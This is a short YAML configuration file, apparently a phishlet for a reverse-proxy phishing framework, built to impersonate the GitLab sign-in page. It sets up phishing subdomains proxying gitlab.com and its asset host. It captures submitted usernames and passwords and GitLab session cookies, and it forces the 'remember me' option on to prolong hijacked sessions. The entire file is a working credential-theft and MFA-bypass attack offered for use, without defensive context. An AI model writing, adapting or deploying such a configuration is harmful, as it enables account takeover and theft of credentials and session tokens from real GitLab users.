```yaml

name: 'gitlab-mfa'
author: '@H3llKa1ser'
min_ver: '2.4.0'
proxy_hosts:
  - {phish_sub: 'gitlab', orig_sub: '', domain: 'gitlab.com', session: true, is_landing: true}
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'gitlab.com', session: true, is_landing: false}
  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'gitlab-static.net', session: false, is_landing: false}
sub_filters:
auth_tokens:
  - domain: 'gitlab.com'
    keys: ['_gitlab_session', 'known_sign_in', 'remember_user_token']
  - domain: '.gitlab.com'
    keys: ['_gitlab_session']
credentials:
  username:
    key: 'user\[login\]'
    search: '(.*)'
    type: 'post'
  password:
    key: 'user\[password\]'
    search: '(.*)'
    type: 'post'
login:
  domain: 'gitlab.com'
  path: '/users/sign_in'
force_post:
  - path: '/users/sign_in'
    search:
      - {key: 'user\[remember_me\]', search: '.*'}
    force:
      - {key: 'user\[remember_me\]', value: '1'}
    type: 'post'

```
